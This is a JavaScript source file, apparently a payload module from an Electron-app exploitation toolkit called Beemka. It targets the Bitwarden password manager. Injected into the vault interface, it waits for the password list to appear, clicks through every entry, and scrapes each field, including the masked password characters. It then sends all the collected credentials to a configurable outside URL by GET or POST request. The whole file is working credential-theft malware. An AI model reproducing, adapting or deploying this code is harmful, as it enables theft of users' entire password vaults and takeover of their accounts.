if (typeof Beemka_Bitwarden === 'undefined') {

    %BEEMKA_VARIABLE_PLACEHOLDER%

    let options = {
        bitwarden: {
            url: beemka_bitwarden_url,
            param: beemka_bitwarden_param,
            method: beemka_bitwarden_method
        }
    };

    let Beemka_Bitwarden = {
        bitwarden: {
            url: options.bitwarden.url,
            param: options.bitwarden.param,
            method: options.bitwarden.method
        },

        init: function() {
            this.enableWatcher();
        },

        enableWatcher: function() {
            setTimeout(function() {
                if (Beemka_Bitwarden.hasPasswordList()) {
                    Beemka_Bitwarden.extractPasswords();
                    return true;
                }
                Beemka_Bitwarden.enableWatcher();
            }, 3000);
        },

        cleanParams: function() {
            Beemka_Bitwarden.bitwarden.interval = parseInt(Beemka_Bitwarden.bitwarden.interval);
        },

        hasPasswordList: function() {
            let passwordBox = document.querySelectorAll('app-vault-ciphers .list');
            return (passwordBox.length > 0);
        },

        extractPasswords: async function() {
            let passwordBox = document.querySelectorAll('app-vault-ciphers .list');
            if (passwordBox.length === 0) {
                console.log('Could not get password list');
                return false;
            }

            let passwordList = passwordBox[0].querySelectorAll('a');
            if (passwordList.length === 0) {
                console.log('No passwords found');
                return false;
            }

            let credentials = [];
            for (let i = 0; i < passwordList.length; i++) {
                let passwordListItem = passwordList[i];

                passwordListItem.click();
                await sleep(100);

                let detailsBox = document.getElementById('details');
                if (!detailsBox) {
                    console.log('Could not get details box');
                    continue;
                }

                let rowBoxes = detailsBox.querySelectorAll('.box-content-row');
                credential = [];
                for (let k = 0; k < rowBoxes.length; k++) {
                    let rowBox = rowBoxes[k];
                    let rowElement = rowBox.querySelector('.row-label');
                    if (!rowElement) {
                        console.log('Could not get label element');
                        continue;
                    }

                    let name = rowElement.innerText.trim();

                    let value = '';
                    let passwordBox = rowBox.querySelectorAll('.password-letter');
                    if (passwordBox.length > 0) {
                        for (let m = 0; m < passwordBox.length; m++) {
                            value += passwordBox[m].innerText;
                        }
                    } else {
                        value = rowBox.textContent.trim();
                        value = value.substr(name.length).trim();
                    }

                    credential.push({
                        name: name,
                        value: value
                    });
                }
                credentials.push(credential);
            }

            console.dir(credentials);

            if (credentials.length === 0) {
                Beemka_Bitwarden.enableWatcher();
                return false;
            }

            let data = JSON.stringify(credentials);
            Beemka_Bitwarden.sendData(data);
        },

        sendData: function(txt) {
            var xhttp = new XMLHttpRequest();
            if (this.bitwarden.method == 'GET') {
                xhttp.open("GET", this.bitwarden.url + '?' + this.bitwarden.param + '=' + encodeURIComponent(txt), true);
                xhttp.send();
            } else {
                xhttp.open('POST', this.bitwarden.url, true);
                xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xhttp.send(this.bitwarden.param + "=" + encodeURIComponent(txt));
            }
        }
    };

    function sleep(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }

    Beemka_Bitwarden.init();
}